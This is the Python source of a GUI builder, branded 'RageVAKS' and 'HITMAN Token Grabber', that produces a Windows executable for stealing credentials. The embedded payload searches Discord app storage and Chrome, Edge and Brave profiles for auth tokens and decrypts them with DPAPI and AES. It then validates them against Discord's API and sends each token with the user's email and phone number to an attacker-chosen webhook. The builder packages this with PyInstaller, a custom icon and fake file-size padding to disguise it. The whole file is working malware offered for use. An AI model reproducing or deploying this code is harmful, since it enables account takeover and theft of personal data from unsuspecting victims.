import customtkinter as ctk
from tkinter import filedialog, messagebox
import tkinter as tk
import os
import sys
import subprocess
import tempfile
import shutil
import time
import threading
import hashlib
import platform
import random
import requests
import json
import base64
import PyInstaller.__main__

class TokenGrabberBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("RageVAKS Builder - HITMAN Token Grabber")
        self.root.geometry("800x700")
        self.root.resizable(False, False)
        
        self.stars = []
        self.discord_webhook = tk.StringVar()
        self.exe_name = tk.StringVar(value="RageVAKS")
        self.icon_path = tk.StringVar()
        self.fake_size = tk.IntVar(value=0)
        
        self.setup_galaxy_background()
        self.show_main_frame()
        self.animate_galaxy()
        
    def setup_galaxy_background(self):
        self.canvas = tk.Canvas(self.root, bg="black", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        for _ in range(150):
            x = random.randint(0, 800)
            y = random.randint(0, 700)
            size = random.randint(1, 4)
            speed = random.uniform(0.1, 0.5)
            color = random.choice(["white", "#c8c8c8", "#e0e0e0", "#f0f0f0"])
            star = self.canvas.create_oval(x, y, x+size, y+size, fill=color, outline="")
            self.stars.append({"id": star, "speed": speed, "size": size})
        
        for _ in range(30):
            x = random.randint(0, 800)
            y = random.randint(0, 700)
            size = random.randint(4, 7)
            speed = random.uniform(0.2, 0.8)
            self.stars.append({
                "id": self.canvas.create_oval(x, y, x+size, y+size, fill="white", outline=""),
                "speed": speed,
                "size": size
            })
            
        for _ in range(15):
            x = random.randint(0, 800)
            y = random.randint(0, 700)
            size = random.randint(3, 6)
            speed = random.uniform(0.1, 0.4)
            color = random.choice(["#ff9999", "#99ff99", "#9999ff", "#ffff99"])
            self.stars.append({
                "id": self.canvas.create_oval(x, y, x+size, y+size, fill=color, outline=""),
                "speed": speed,
                "size": size
            })
        
    def animate_galaxy(self):
        for star in self.stars:
            self.canvas.move(star["id"], 0, star["speed"])
            
            pos = self.canvas.coords(star["id"])
            if pos[1] > 700:
                self.canvas.move(star["id"], 0, -750)
                self.canvas.move(star["id"], random.randint(-100, 100), 0)
        
        self.root.after(30, self.animate_galaxy)
            
    def clear_frame(self):
        for widget in self.canvas.winfo_children():
            if isinstance(widget, (ctk.CTkFrame, ctk.CTkButton, ctk.CTkLabel, ctk.CTkEntry, ctk.CTkProgressBar)):
                widget.destroy()
            
    def show_main_frame(self):
        self.clear_frame()
        
        main_frame = ctk.CTkFrame(self.canvas, fg_color=("gray10", "gray10"), corner_radius=15, width=600, height=500)
        main_frame.place(relx=0.5, rely=0.5, anchor="center")
        
        title = ctk.CTkLabel(main_frame, text="RageVAKS Builder", 
                            font=ctk.CTkFont(size=24, weight="bold"), text_color="white")
        title.pack(pady=20)
        
        subtitle = ctk.CTkLabel(main_frame, text="HITMAN Token Grabber", 
                               font=ctk.CTkFont(size=16), text_color="#00ffff")
        subtitle.pack(pady=5)
        
        config_frame = ctk.CTkScrollableFrame(main_frame, width=550, height=300, fg_color=("gray15", "gray15"))
        config_frame.pack(pady=20, padx=10, fill="both", expand=True)
        
        ctk.CTkLabel(config_frame, text="Discord Webhook URL:", text_color="white").pack(pady=5)
        webhook_entry = ctk.CTkEntry(config_frame, textvariable=self.discord_webhook, width=400, 
                                    placeholder_text="https://discord.com/api/webhooks/...")
        webhook_entry.pack(pady=5)
        
        ctk.CTkLabel(config_frame, text="Executable Name:", text_color="white").pack(pady=5)
        name_entry = ctk.CTkEntry(config_frame, textvariable=self.exe_name, width=400, 
                                 placeholder_text="RageVAKS")
        name_entry.pack(pady=5)
        
        ctk.CTkLabel(config_frame, text="Custom Icon (optional):", text_color="white").pack(pady=5)
        icon_frame = ctk.CTkFrame(config_frame, fg_color="transparent")
        icon_frame.pack(pady=5)
        
        ctk.CTkButton(icon_frame, text="Select Icon", command=self.select_icon, 
                     fg_color="#4B0082", hover_color="#800080").pack(side="left", padx=5)
        self.icon_label = ctk.CTkLabel(icon_frame, text="No icon selected", text_color="white")
        self.icon_label.pack(side="left", padx=5)
        
        ctk.CTkLabel(config_frame, text="Fake File Size (MB, optional):", text_color="white").pack(pady=5)
        size_frame = ctk.CTkFrame(config_frame, fg_color="transparent")
        size_frame.pack(pady=5)
        
        size_slider = ctk.CTkSlider(size_frame, from_=0, to=100, variable=self.fake_size, width=300,
                                   progress_color="#4B0082", button_color="#800080", button_hover_color="#9370DB")
        size_slider.pack(side="left", padx=5)
        self.size_label = ctk.CTkLabel(size_frame, text="0 MB", text_color="white")
        self.size_label.pack(side="left", padx=5)
        self.fake_size.trace("w", self.update_size_label)
        
        build_btn = ctk.CTkButton(main_frame, text="Build Executable", command=self.show_build_frame, 
                                 height=40, width=200, fg_color="#4B0082", hover_color="#800080")
        build_btn.pack(pady=20)
        
        links_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
        links_frame.pack(pady=10)
        
        github_btn = ctk.CTkButton(links_frame, text="GitHub", command=self.open_github,
                                  fg_color="#333355", hover_color="#444466", width=100)
        github_btn.pack(side="left", padx=10)
        
        discord_btn = ctk.CTkButton(links_frame, text="Discord", command=self.open_discord,
                                   fg_color="#333355", hover_color="#444466", width=100)
        discord_btn.pack(side="left", padx=10)
    
    def show_build_frame(self):
        webhook = self.discord_webhook.get().strip()
        exe_name = self.exe_name.get().strip()
        
        if not webhook:
            messagebox.showerror("Error", "Please enter Discord webhook URL")
            return
        
        if not exe_name:
            messagebox.showerror("Error", "Please enter executable name")
            return
        
        if not webhook.startswith("https://discord.com/api/webhooks/"):
            if not messagebox.askyesno("Warning", "The webhook URL doesn't look valid. Continue anyway?"):
                return
        
        self.clear_frame()
        
        build_frame = ctk.CTkFrame(self.canvas, fg_color=("gray10", "gray10"), corner_radius=15, width=600, height=400)
        build_frame.place(relx=0.5, rely=0.5, anchor="center")
        
        title = ctk.CTkLabel(build_frame, text="Building Executable", 
                            font=ctk.CTkFont(size=24, weight="bold"), text_color="white")
        title.pack(pady=20)
        
        self.progress_bar = ctk.CTkProgressBar(build_frame, width=400, progress_color="#4B0082")
        self.progress_bar.set(0)
        self.progress_bar.pack(pady=10)
        
        self.progress_label = ctk.CTkLabel(build_frame, text="Ready to build", text_color="white")
        self.progress_label.pack(pady=5)
        
        self.percentage_label = ctk.CTkLabel(build_frame, text="0%", text_color="white", 
                                            font=ctk.CTkFont(size=16, weight="bold"))
        self.percentage_label.pack(pady=5)
        
        build_btn = ctk.CTkButton(build_frame, text="Start Build", command=self.start_build_process, 
                                 height=40, width=200, fg_color="#4B0082", hover_color="#800080")
        build_btn.pack(pady=20)
        
        back_btn = ctk.CTkButton(build_frame, text="Back to Configuration", command=self.show_main_frame, 
                                height=30, width=200, fg_color="#2F4F4F", hover_color="#708090")
        back_btn.pack(pady=10)
    
    def update_progress(self, value, text):
        self.progress_bar.set(value)
        self.percentage_label.configure(text=f"{int(value * 100)}%")
        self.progress_label.configure(text=text)
        self.root.update()
    
    def start_build_process(self):
        build_thread = threading.Thread(target=self.build_executable)
        build_thread.daemon = True
        build_thread.start()
    
    def select_icon(self):
        file_path = filedialog.askopenfilename(
            title="Select Icon File",
            filetypes=[("Icon files", "*.ico"), ("All files", "*.*")]
        )
        
        if file_path:
            self.icon_path.set(file_path)
            self.icon_label.configure(text=os.path.basename(file_path))
    
    def update_size_label(self, *args):
        self.size_label.configure(text=f"{self.fake_size.get()} MB")
    
    def open_github(self):
        import webbrowser
        webbrowser.open("https://github.com/hitmanos/tokengrabber")
    
    def open_discord(self):
        import webbrowser
        webbrowser.open("https://discord.gg/CrAqFQkvHC")
    
    def build_executable(self):
        webhook = self.discord_webhook.get().strip()
        exe_name = self.exe_name.get().strip()
        
        try:
            self.update_progress(0.1, "Validating inputs...")
            time.sleep(1)
            
            self.update_progress(0.3, "Creating modified script...")
            script_content = self.create_modified_script(webhook)
            time.sleep(1)
            
            self.update_progress(0.5, "Building executable with PyInstaller...")
            self.build_with_pyinstaller(script_content, exe_name)
            
            if self.fake_size.get() > 0:
                self.update_progress(0.8, "Adding fake file size...")
                self.add_fake_size(exe_name)
                time.sleep(1)
            
            self.update_progress(1.0, "Build completed successfully!")
            
            time.sleep(1)
            
            messagebox.showinfo("Success", f"Executable built successfully!\n\nFile: {exe_name}.exe\nLocation: dist folder")
            
        except Exception as e:
            self.update_progress(0, f"Build failed: {str(e)}")
            messagebox.showerror("Error", f"Build failed: {str(e)}")
    
    def create_modified_script(self, webhook):
        token_grabber_code = '''
import requests as r
import json as j
import os as o
import re as e
import base64 as b
import subprocess as s
import sys as y
from Crypto.Cipher import AES
import win32crypt
import asyncio

WEBHOOK_URL = "{webhook_url}"

def setup():
    modules = [("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")]
    for module, pip_name in modules:
        try:
            __import__(module)
        except:
            s.check_call([y.executable, "-m", "pip", "install", pip_name], 
                        stdout=s.DEVNULL, stderr=s.DEVNULL, stdin=s.DEVNULL)

setup()

def send_webhook(embed_data):
    try:
        data = {{
            "username": "HITMANGRABBER",
            "avatar_url": "https://cdn.discordapp.com/attachments/1420574144373854359/1438704517762777280/image.png",
            "embeds": [embed_data]
        }}
        r.post(WEBHOOK_URL, json=data, timeout=5)
    except:
        pass

def get_user_data(token):
    headers = {{'Authorization': token, 'Content-Type': 'application/json'}}
    try:
        response = r.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
        return response.json() if response.status_code == 200 else None
    except:
        return None

def find_discord_tokens():
    local = o.getenv('LOCALAPPDATA')
    roaming = o.getenv('APPDATA')
    paths = {{
        'Discord': roaming + '\\\\Discord',
        'Discord Canary': roaming + '\\\\discordcanary',
        'Discord PTB': roaming + '\\\\discordptb',
        'Discord Development': roaming + '\\\\DiscordDevelopment'
    }}

    def extract_tokens(path):
        path += "\\\\Local Storage\\\\leveldb"
        found_tokens = []
        if not o.path.exists(path):
            return found_tokens
            
        for file in o.listdir(path):
            if not file.endswith((".ldb", ".log")):
                continue
            try:
                with open(o.path.join(path, file), "r", errors="ignore") as f:
                    content = f.read()
                    patterns = [
                        r"[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}",
                        r"mfa\\.[\\w-]{{84}}",
                        r"dQw4w9WgXcQ:[^\\"]*"
                    ]
                    for pattern in patterns:
                        found_tokens.extend(e.findall(pattern, content))
            except:
                continue
        return found_tokens

    def decrypt_token(encrypted_token, key):
        try:
            if encrypted_token.startswith("dQw4w9WgXcQ:"):
                encrypted_value = encrypted_token.split("dQw4w9WgXcQ:")[1]
                encrypted_value = b.b64decode(encrypted_value)
                iv = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(ciphertext).decode('utf-8')
        except:
            pass
        return encrypted_token

    valid_tokens = []
    for platform, path in paths.items():
        if not o.path.exists(path):
            continue
            
        tokens = extract_tokens(path)
        key = None
        local_state_path = o.path.join(path, "Local State")
        if o.path.exists(local_state_path):
            try:
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = j.load(f)
                encrypted_key = b.b64decode(local_state["os_crypt"]["encrypted_key"])
                encrypted_key = encrypted_key[5:]
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            except:
                pass

        for token in tokens:
            if key and token.startswith("dQw4w9WgXcQ:"):
                decrypted_token = decrypt_token(token, key)
            else:
                decrypted_token = token

            if decrypted_token in valid_tokens:
                continue

            user_data = get_user_data(decrypted_token)
            if user_data:
                valid_tokens.append(decrypted_token)

    return valid_tokens

def find_browser_tokens():
    tokens = []
    paths = [
        o.path.join(o.environ['APPDATA'], 'discord'),
        o.path.join(o.environ['APPDATA'], 'discordptb'),
        o.path.join(o.environ['APPDATA'], 'discordcanary'),
        o.path.join(o.environ['LOCALAPPDATA'], 'Google', 'Chrome'),
        o.path.join(o.environ['LOCALAPPDATA'], 'Microsoft', 'Edge'),
        o.path.join(o.path.expanduser('~'), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser'),
    ]
    
    patterns = [
        r"[\\w-]{{24,28}}\\.[\\w-]{{6}}\\.[\\w-]{{25,40}}",
        r"mfa\\.[\\w-]{{80,}}",
        r"(eyJ[a-zA-Z0-9]{{10,}}\\.eyJ[a-zA-Z0-9]{{10,}}\\.[a-zA-Z0-9_-]{{10,}})"
    ]
    
    for path in paths:
        if not o.path.exists(path):
            continue
            
        for root, _, files in o.walk(path):
            for file in files:
                if file.lower().endswith(('.log', '.ldb', '.sqlite', '.db')):
                    try:
                        file_path = o.path.join(root, file)
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            for pattern in patterns:
                                tokens.extend(e.findall(pattern, content))
                    except:
                        continue
    
    return list(set(tokens))

async def scan_and_send_tokens():
    try:
        discord_tokens = find_discord_tokens()
        browser_tokens = find_browser_tokens()
        
        all_valid_tokens = []
        
        for token in discord_tokens:
            user_data = get_user_data(token)
            if user_data:
                token_info = {{
                    'token': token,
                    'user_data': user_data,
                    'type': 'discord'
                }}
                all_valid_tokens.append(token_info)
        
        for token in browser_tokens:
            user_data = get_user_data(token)
            if user_data:
                token_info = {{
                    'token': token,
                    'user_data': user_data,
                    'type': 'browser'
                }}
                all_valid_tokens.append(token_info)
        
        if all_valid_tokens:
            discord_count = len([t for t in all_valid_tokens if t['type'] == 'discord'])
            browser_count = len([t for t in all_valid_tokens if t['type'] == 'browser'])
            
            for i, token_info in enumerate(all_valid_tokens, 1):
                user_data = token_info['user_data']
                token_type = "Discord App" if token_info['type'] == 'discord' else "Browser"
                avatar_url = f"https://cdn.discordapp.com/avatars/{{user_data.get('id', '')}}/{{user_data.get('avatar', '')}}.png" if user_data.get('avatar') else "https://discord.com/assets/2c21aeda16de354ba5334551a883b481.png"
                
                token_embed = {{
                    "title": f"Token #{{i}} ({{token_type}})",
                    "color": 0xFF0000,
                    "thumbnail": {{"url": avatar_url}},
                    "fields": [
                        {{"name": "Token", "value": f"```{{token_info['token']}}```", "inline": False}},
                        {{"name": "Username", "value": f"```{{user_data.get('username', 'N/A')}}#{{user_data.get('discriminator', '0000')}}```", "inline": True}},
                        {{"name": "Email", "value": f"```{{user_data.get('email', 'N/A')}}```", "inline": True}},
                        {{"name": "Phone", "value": f"```{{user_data.get('phone', 'N/A')}}```", "inline": True}},
                        {{"name": "User ID", "value": f"```{{user_data.get('id', 'N/A')}}```", "inline": True}}
                    ],
                    "footer": {{
                        "text": "github.com/hitmanos/tokengrabber | HITMAN"
                    }}
                }}
                send_webhook(token_embed)
            
            summary_embed = {{
                "title": "Scan Complete",
                "color": 0xFF0000,
                "description": f"**Total Tokens:** {{len(all_valid_tokens)}}\\n**Discord Apps:** {{discord_count}}\\n**Browsers:** {{browser_count}}",
                "footer": {{
                    "text": "github.com/hitmanos/tokengrabber | HITMAN"
                }}
            }}
            send_webhook(summary_embed)
        else:
            no_tokens_embed = {{
                "title": "Scan Complete",
                "color": 0xFF0000,
                "description": "No valid Discord tokens found",
                "footer": {{
                    "text": "github.com/hitmanos/tokengrabber | HITMAN"
                }}
            }}
            send_webhook(no_tokens_embed)
            
    except Exception as e:
        pass

def main():
    asyncio.run(scan_and_send_tokens())

if __name__ == "__main__":
    main()
'''
        
        formatted_code = token_grabber_code.format(webhook_url=webhook)
        
        temp_dir = tempfile.mkdtemp()
        temp_script = os.path.join(temp_dir, "tokengrabber_build.py")
        
        with open(temp_script, 'w', encoding='utf-8') as f:
            f.write(formatted_code)
        
        return temp_script
    
    def build_with_pyinstaller(self, script_path, exe_name):
        if not os.path.exists('dist'):
            os.makedirs('dist')
            
        cmd = [
            'pyinstaller',
            '--onefile',
            '--console',
            f'--name={exe_name}',
            '--distpath=dist',
            '--hidden-import=win32crypt',
            '--hidden-import=Crypto.Cipher.AES',
            '--hidden-import=requests',
            '--hidden-import=json',
            '--hidden-import=os',
            '--hidden-import=re',
            '--hidden-import=base64',
            '--hidden-import=subprocess',
            '--hidden-import=sys',
            '--hidden-import=asyncio',
            '--clean',
            '--noconfirm',
            script_path
        ]
        
        if self.icon_path.get():
            cmd.append(f'--icon={self.icon_path.get()}')
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                     universal_newlines=True, shell=True)
            
            stdout, stderr = process.communicate()
            
            if process.returncode != 0:
                raise Exception(f"PyInstaller failed: {stderr}")
                
        except Exception as e:
            raise Exception(f"PyInstaller execution error: {str(e)}")
    
    def add_fake_size(self, exe_name):
        exe_path = os.path.join('dist', exe_name + '.exe')
        target_size = self.fake_size.get() * 1024 * 1024
        
        if os.path.exists(exe_path):
            current_size = os.path.getsize(exe_path)
            
            if current_size < target_size:
                with open(exe_path, 'ab') as f:
                    f.write(b'0' * (target_size - current_size))

if __name__ == "__main__":
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("dark-blue")
    
    root = ctk.CTk()
    app = TokenGrabberBuilder(root)

    root.mainloop()
# if u like this pls give star on github       
